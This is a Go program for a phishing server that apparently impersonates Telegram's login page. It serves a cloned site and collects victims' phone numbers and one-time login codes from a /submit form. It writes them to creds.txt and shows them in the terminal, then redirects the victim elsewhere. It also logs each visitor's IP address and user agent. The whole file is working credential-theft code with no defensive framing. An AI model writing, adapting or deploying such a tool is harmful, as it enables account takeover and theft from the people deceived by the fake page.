package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

// ANSI color escape codes
const (
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorReset  = "\033[0m"
)

func main() {
	// Display ASCII art
	fmt.Println(`
	` + ColorGreen + `                                                                                
	@@@@@@@  @@@  @@@ @@@  @@@@@@ @@@  @@@ @@@@@@@@ @@@@@@@       @@@@@@@   @@@@@@  
	@@!  @@@ @@!  @@@ @@! !@@     @@!  @@@ @@!      @@!  @@@     !@@       @@!  @@@ 
	@!@@!@!  @!@!@!@! !!@  !@@!!  @!@!@!@! @!!!:!   @!@!!@!      !@! @!@!@ @!@  !@! 
	!!:      !!:  !!! !!:     !:! !!:  !!! !!:      !!: :!!  !:! :!!   !!: !!:  !!! 
	 :        :   : : :   ::.: :   :   : : : :: ::   :   : : :::  :: :: :   : :. :  
																					
	` + ColorReset)

	// Choose options
	var option string
	fmt.Print("Choose options (e.g., Telegram): ")
	fmt.Scanln(&option)

	// Check if the chosen option is Telegram
	if option != "Telegram" {
		log.Fatal(ColorRed + "Only Telegram option is supported for now." + ColorReset)
	}

	// Ask if OTP is enabled
	var enableOTP string
	fmt.Print("Do you want to enable OTP? (yes/no): ")
	fmt.Scanln(&enableOTP)

	// Check if OTP is enabled
	if strings.ToLower(enableOTP) != "yes" {
		log.Fatal(ColorRed + "OTP is required for now." + ColorReset)
	}

	// Get redirect URL
	var redirectURL string
	fmt.Print("Enter redirect URL: ")
	reader := bufio.NewReader(os.Stdin)
	redirectURL, _ = reader.ReadString('\n')
	redirectURL = strings.TrimSpace(redirectURL)

	// Serve static files
	http.Handle("/", logRequest(http.FileServer(http.Dir("./sites/telegram"))))

	// Define HTTP handler for form submission
	http.HandleFunc("/submit", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		// Parse form data
		if err := r.ParseForm(); err != nil {
			http.Error(w, "Failed to parse form data", http.StatusInternalServerError)
			return
		}

		// Get phone number and OTP from form
		phoneNumber := r.Form.Get("phonenumber")
		otp := r.Form.Get("otp")

		// Display values in terminal
		log.Printf(ColorGreen+"Received Phone Number: %s, OTP: %s"+ColorReset, phoneNumber, otp)

		// Write to creds.txt
		if err := writeToCredsFile(phoneNumber, otp); err != nil {
			http.Error(w, "Failed to write to creds.txt", http.StatusInternalServerError)
			return
		}

		// Redirect user back to the specified URL
		http.Redirect(w, r, redirectURL, http.StatusSeeOther)
	})

	// Start HTTP server
	go func() {
		if err := http.ListenAndServe(":8080", nil); err != nil {
			log.Fatalf(ColorRed+"Failed to start HTTP server: %v"+ColorReset, err)
		}
	}()

	// Wait for termination signal
	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	<-quit // Block until a termination signal is received
	fmt.Println(ColorYellow + "Server terminated." + ColorReset)
}

func writeToCredsFile(phoneNumber, otp string) error {
	// Create or open creds.txt file
	file, err := os.OpenFile("creds.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	// Write phone number and OTP to creds.txt
	if _, err := fmt.Fprintf(file, "Phone Number: %s, OTP: %s\n", phoneNumber, otp); err != nil {
		return err
	}

	return nil
}

// Middleware to log request details
func logRequest(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()

		// Call the next handler
		next.ServeHTTP(w, r)

		// Log request details
		log.Printf(ColorYellow + "Request Received:" + ColorReset)
		log.Printf("    Client: %s", r.RemoteAddr)
		log.Printf("    IP: %s", getIPAddress(r))
		log.Printf("    URL: %s", r.URL.String())
		log.Printf("    Method: %s", r.Method)
		log.Printf("    User-Agent: %s", r.UserAgent())
		log.Printf("    Duration: %s", time.Since(start))
	})
}

// Function to get client's IP address
func getIPAddress(r *http.Request) string {
	// Get IP address from request headers
	ip := r.Header.Get("X-Forwarded-For")
	if ip != "" {
		return ip
	}

	// Get IP address from remote address
	if host, _, err := net.SplitHostPort(r.RemoteAddr); err == nil {
		return host
	}
	return "unknown"
}
